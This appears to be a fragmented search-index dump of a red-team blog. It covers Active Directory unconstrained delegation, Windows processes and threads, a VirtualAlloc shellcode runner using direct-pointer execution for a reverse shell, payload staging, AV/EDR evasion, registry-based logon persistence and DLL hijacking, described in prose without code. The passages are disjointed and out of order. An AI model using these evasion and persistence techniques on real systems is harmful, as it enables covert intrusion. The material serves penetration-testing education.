Usually such privileges are granted on computers that run various services, like MSSQL / IIS or on users with bigger administrative needs.","To better understand it, let's take the following example: A user is authenticating and operating to IIS service which is connected to a MSSQL database. When the DB backend needs to be modified the IIS server connects to it on behalf of the user, thus, the IIS service or perhaps the whole machine could be entrusted for delegation.","Another example would be to entrust sysadmins or HelpDesk users to perform operational roles (create, manage and delete) for other domain users. In this case, specific tasks in the context of the Active Directory would be delegated to specific group of people."]},{"i":"what-is-unconstrained-delegation","l":"What is Unconstrained Delegation?","p":["Normally, the delegations across the Active Directory should be strictly configured. It should explicitly map the delegated user / machine to the specific services and nothing more.","Unconstrained Delegation also known as Unrestricted Delegation is characterized with that it is NOT limited to specific service, but instead it impersonates the designed user / machine with all of its access rights and permissions across the AD context. Unrestricted Delegation is designed to save the delegated user's TGT directly into the computer's memory.","For instance, if we take the previous User -> ISS -> MSSQL example, if the same scenario was replicated with configured Unconstrained Delegation, the IIS service would obtain a valid TGT for the user connecting to it.","Any authentication towards Unconstrained Delegated machine, will effectively save the incoming user's TGT into the memory of the machine.

When you start a program in Windows, the operating system allocates resources such as memory, CPU time, and I/O devices to execute that program. This allocation is done by creating a process for the program. The process contains all the necessary information for the program's execution, including its code, data, and execution state.","Processes in Windows operate in a multitasking environment, meaning that multiple processes can run concurrently, sharing the system's resources efficiently. Generally, they can be categorized into several types based on their characteristics and how they're created:","User Processes: These are initiated by users and typically include applications such as web browsers, word processors, and media players. User processes run in user mode, which provides a layer of protection and isolation from system-level operations.","System Processes: System processes, also known as kernel processes, are initiated and managed by the Windows kernel. They perform essential system functions such as memory management, I/O operations, and device drivers. System processes run in kernel mode, allowing them to access system resources directly.","Service Processes: Services are background processes that run without user intervention, providing various system functionalities such as network communication, printing, and system monitoring. These processes often start automatically when the system boots up and continue running in the background.","Child Processes: A process can create additional processes known as child processes. These processes inherit certain attributes from their parent process and can perform tasks independently. Child processes are commonly used in multitasking environments to execute parallel tasks or subprocesses.","A cool program to analyze running processes is Process Hacker 2.","Running processes viewed from Process Hacker 2"]},{"l":"Threads","p":["A thread can be defined as the smallest unit of execution within a process. Unlike processes, which are independent entities with their own memory space, threads exist within processes and share the same memory space. Threads enable concurrent execution of multiple tasks within a single process, allowing for parallelism and efficient utilization of system resources, such as CPU cores.","Each thread within a process has its own program counter, stack, and execution state, but they can access shared data and resources within the process. This shared memory model facilitates communication and coordination between threads, enabling them to collaborate on complex tasks.","Threads can execute independently or cooperatively, depending on the programming paradigm and synchronization mechanisms employed. Concurrent execution of threads can lead to improved performance, responsiveness, and resource utilization, especially in scenarios involving parallelizable tasks, such as multimedia processing, web servers, and scientific simulations.","Threads can be categorized into two main types based on their association with the operating system or programming language:","Kernel Threads: Kernel threads are managed and scheduled by the operating system's kernel. These threads have full support for multitasking and can execute in parallel on multiple CPU cores. Kernel threads provide a low-level abstraction for concurrent execution and are typically used in system-level programming and operating system development.","User Threads: User threads are implemented and managed at the application level, typically using threading libraries or programming language constructs. Unlike kernel threads, user threads are not directly supported by the operating system and rely on the underlying runtime environment or threading library for scheduling and execution. User threads offer a higher-level abstraction for concurrency and are commonly used in application development, including web servers, database systems, and multimedia applications.","Again, threads can be analyzed with the same Process Hacker 2 software after choosing a process of your choice.","Analyzing threads of taskhostw.exe process"]},{"l":"Anatomy of Process Injection","p":["So far it should be around clear on what is process and a thread.

If that is the case, simply returning the PID does not work for us, because we would not be able to open the process either way. The code snippet above tries to open handle to the process, and return only if a handle is valid.

Unlike conventional methods where the entire malicious code is delivered at once, staging involves a two(or more) step process. Initially, a small and innocuous piece of code, often referred to as the stager, is deployed onto the target system. Subsequently, this stager communicates with a remote server controlled by the attacker to retrieve the actual malicious payload.","This tactic serves a dual purpose: evasion and flexability. By implementing shellcode runner that dynamically fetch its payload during runtime, you first achieve more evasiveness, because the AV/EDR system is having extremely hard time to predict what the dropper is trying or going to do.

Whether you're accessing a file stored on a server, printing a document from your laptop, or sharing data between colleagues, chances are SMB is working behind the scenes to make it happen.","At its core, SMB enables a client device, such as a computer or printer, to request services from a server program located on another device within the network. These services can range from file operations, such as reading, writing, and deleting files, to more complex tasks like accessing shared directories and managing network resources. While SMB is protocol which can be used in pretty much any environment, it lies at the heart of Windows networking.","In Windows operating systems, SMB is deeply integrated into the networking stack, providing essential functionality for file and print services. By default, Windows client operating systems, such as Windows 10, and server operating systems, such as Windows Server 2019, include both SMB client and server components.","SMB Client: The SMB client component enables Windows devices to access shared resources hosted on remote servers. When a user accesses a shared folder or printer, the SMB client initiates a connection to the remote server using the SMB protocol, facilitating file and print operations.","SMB Server: Similarly, Windows server operating systems include the SMB server component, allowing them to host shared resources accessible to client devices on the network. Administrators can configure shared folders, set permissions, and manage access control using the built-in SMB server functionality.","With that being said, since the SMB protocol is mainly designed to share files, and its builtin in any modern Windows OS, why not simply use it for staging?","While it sounds all fun and good, there is a caveat, if an environment is properly configured, any outgoing SMB traffic would be completely disabled.

By sitting there as plain hex string, its not really useful to us.","The 3rd parameter is the memory type.","The arguments here are self explanatory, but in a nutshell we copy a variable called buf(our shellcode), into the memory region we just allocated pAddr(pointing to the beginning of the memory region). Keep in mind that the size here is extremely important, if that is messed up, the POC will not work.","The first parameter is NULL because we do not have the exact memory address from where the allocation to start. By specifying NULL, the OS will handle that automatically.","The first step is to declare our libraries and then the shellcode:","The good thing about Win32 APIs is that they are extremely well documented. By browsing the Microsoft Docs, you can get the functions signatures, and in best cases, example usage. Based on the docs, the VirtualAlloc API should be used like that:","The second parameter of the call is about the size of the memory we want to allocate","Then we need to allocate memory within the process address space, in order to write the shellcode into it. This can be done with various Win32 APIs such as VirtualAlloc or native C functions such as malloc.","Translating that to our little POC, this becomes:","void(*)(): This part declares a function pointer. Here, it specifies that we are dealing with a pointer to a function that returns nothing (void). The (*) syntax indicates a pointer to a function, and void specifies the return type of the function.","We define pointer to memory address as pAddr to be equal to the result of VirtualAlloc call.","What if instead of creating a new thread, we redirect the execution flow of the current thread to the written in memory shellcode? Well this is what the Direct Pointer (DP) really is.","When executed, the terminal hangs because the main thread is now executing the shellcode, which granted us a reverse shell, which hijacked the execution flow. In more simple term, the shellcode payload is simple and it will lock our application (the main thread in this case) until its running.","Which will translate to our code like:","While it is highly important to understand its parameters in details, referring to them now will prolong the blog to unimaginable length, so I highly advice you to read the docs and understand what all these parameters mean.","With that, our final piece of POC looks like that:","Writing payload step"]},{"l":"What is the BIG deal about Direct Pointer","p":["In the POC we implemented, there are countless numbers of suspicious artifacts, such as allocating memory with RWX primitives, keeping the shellcode within the binary itself or simply following the basic shellcode execution workflow with known Win32 APIs.

This is because the DP is extremely hard to be detected. Most AVs and EDRs are relying on mechanisms that can catch the memory allocation and writing primitives. Signatures are scanning the shellcode and memory scanners are scanning what happens in the Windows OS when the payload is executed, but the whole execution primitive in this case is extremely hard to be detected. By using DP, no new threads appear, no suspicious callback functions are called, nor any Win32 APIs methods.","Disclaimer: Just by using DP is of course not enough to be evasive, but this is one of my favorite execution techniques.","I encourage you to take the things from this blog one step further into examining various alternative Win32 APIs.

Today, let's embark on a journey into malware development once again, and more specifically - establishing persistence. As ethical hackers, our mission isn't just about breaching defenses; it's about understanding the defender's playbook to strengthen our offenses.","While establishing persistence is often not needed during engagements (pentesting projects), there are rare cases where it is extremely important. I am aware that there are plenty of open source tools like SharPersist, but I think that it can be valuable to craft our own little POCs. With the ability to write POCs, they can now be customly integrated into C2 frameworks, packing applications, or even custom shellcode runners.","Before diving deeper into this topic, make sure to join my Discord where we share experience, knowledge and doing CTFs together.","If you have further appreciation for my work, don't hesitate to become my Patreon!

But what's next? That's where persistence comes into play. It's the art of maintaining access covertly, like leaving a hidden key under the doormat for future entry. There are 2 main important aspects of establishing persistence:","Evasiveness","Speed","In order to establish persistence, the payload must be present on the compromised system. This can vary from anything like storing .exe file on hidden local / share path, up to replacing a legitimately looking .dll file with a one with malicious payload inside (DLL Hijacking). This is done because on reboot, all cached memory is deleted, which means that in order to establish proper persistence, the malicious payload should by itself be persistent on the targeted machine. Usually, the targeted endpoints are protected with some form of endpoint protection, which generally mean AV or EDR. I personally have never seen workstation or server without endpoint protection in real engagement. In order to establish persistence, the payload should be enough evasive by itself, otherwise you can imagine what goes next.","It also depends in what context you received your initial access. There are multiple cases in which this might happen, but one of the most known one is via phishing. If this is the case, the speed is extremely important. There are situations where your initial payload is working, but as soon as you touch that C2 console, the runtime detection kills your beacon, especially, if you directly start running risky commands like execute-assembly. In order to not be in that case, it is crucial to establish persistence as soon as your beacons open up! If the initial breach was done from service level exploitation for example, then you would have definitely more time, and also, the service level attacks are by themselves a kind of persistence. If the beacon dies, you can technically exploit the service again. Of course that this will raise more attention than needed, but you got the idea!","I know that there are endless ways of establishing persistence, I cannot say which one of them is the best because there is no \"best\" method, since the evasiveness may vary between different environments. But let's think about it in a different way - Is it possible to establish persistence right off the bat, with the initial payload itself? Well, YES!"]},{"l":"Some windows internals and theory"},{"l":"General persistence workflow","p":["Establishing persistence isn't about wreaking havoc; mainly because the havoc itself will help the blue teamers find and kill your persistence payloads. Generally, establishing persistence is about making evasive payload that will trigger new C2 beacon when executed -> then store it somewhere to be as hidden as possible and -> then force the Windows OS to execute it each time some action is performed.","This action might be rebooting the machine, login from specific user account, starting the screensaver, forcing the sticky keys prompt out or even time based persistence via the task scheduler.

Think of it as a digital library where Windows stores crucial information about hardware, software, user preferences, and system settings. Within this repository, registry keys play a pivotal role - they serve as containers that organize and categorize various settings and values.","Registry keys follow a hierarchical structure, like folders within folders in a file system. At the top level, we have five main branches, known as \"hives,\" each responsible for specific aspects of system configuration:","HKEY_CLASSES_ROOT( HKCR): Contains file type associations and OLE object class information.","HKEY_CURRENT_USER( HKCU): Stores settings specific to the currently logged-in user.","HKEY_LOCAL_MACHINE( HKLM): Holds system-wide settings applicable to all users on the machine.","HKEY_USERS( HKU): Stores profiles for all user accounts on the system.","HKEY_CURRENT_CONFIG( HKCC): Provides a pointer to the current hardware profile being used by the system.","Within each hive, we find a plethora of subkeys, each housing a unique set of configuration settings. These keys may contain values such as strings, integers, binary data, or even references to other resources.","Registry keys play a crucial role in configuring and customizing the Windows operating system.

When the user logs in, we want explorer.exe to start, so that the user can now operate with Windows OS via the GUI. If we have the needed access rights, we can simply modify this key, so that on the next user signin, the specified payload will be executed. Just for demonstration purposes, let's use powershell.exe as a payload. While it sounds quick and simple, there is one caveat to this technique. We cannot replace or remove explorer.exe as it will break the logon process afterwards.","The payload is executed in Medium integrity level and from the context of the logged in user. It will execute for any user that logs in to the system.","These functions allow us to open a registry hive, and modify its values if, of course, we have the appropriate privileges over the system.","This is cool but how often I might get admin shell directly? Is it possible to establish persistence in userland?","To achieve this logon persistence, we will need administrative local access first.

Unlike HKEY_LOCAL_MACHINE, which contains system-wide settings, HKCU stores settings that are unique to each user profile.

The interesting part is that no matter what is added, if it is a valid path to binary, it will get executed.","The registry key name does not matter in this scenario.","Since in this demo we want to add and not modify a key, the RegCreateKeyExA Win32 API needs to be introduced:","This API, as the name suggest, allows us to create a registry key inside the specified path.

This is DLL Hijacking.","By default, in Windows OS, when an application loads dynamic link libraries (DLLs), the operating system follows a specific search order to locate these DLLs. The search order is prioritized as:","The directory from which the application is loaded: The system looks for DLLs in the same directory as the executable file of the application.","The current working directory: If the DLL is not found in the application's directory, the system searches the current working directory. However, be cautious with relying on the current working directory, as it can change during the execution of the program.","Windows System directories: If the DLL is not found in the application's directory or the current working directory, the system searches the directories listed in the system's PATH environment variable. This includes standard system directories like C:\\Windows\\System32.","Windows directories: If the DLL is not found in the aforementioned locations, the system searches the Windows directory.","Directories listed in the PATH environment variable: If the DLL is not found in any of the previous locations, the system searches the directories listed in the PATH environment variable.","This search priority is often abused for DLL Hijacking attacks, since a lot of applications will initially request a DLL from a folder where the user has write access rights over.","When developing an application, it is important to use full paths for the needed modules in order to avoid hijacking vulnerabilities."]},{"l":"Classical DLL Hijacking","p":["By \"Classical DLL Hijacking\" I mean the exploitation of DLL Hijacking vulnerability just for demonstrative purposes (a.k.a not caring about evasion, you just want to prove that the application is vulnerable).","During this blogpost I am using DVTA for my testing environment.","Finding a DLL Hijacking vulnerability is as simple as scanning different processes for their module imports, and overwriting a module if you have write access to the path on the filesystem where it is missing or loaded.","This behavior can be easily analyzed with tools like Process Monitor. If you specify the following filters, ProcMon will scan the defined process for all DLL imports.","Filtering DVTA process and all DLL imports","After the filters are applied it is recommended to restart the application for maximum coverage.
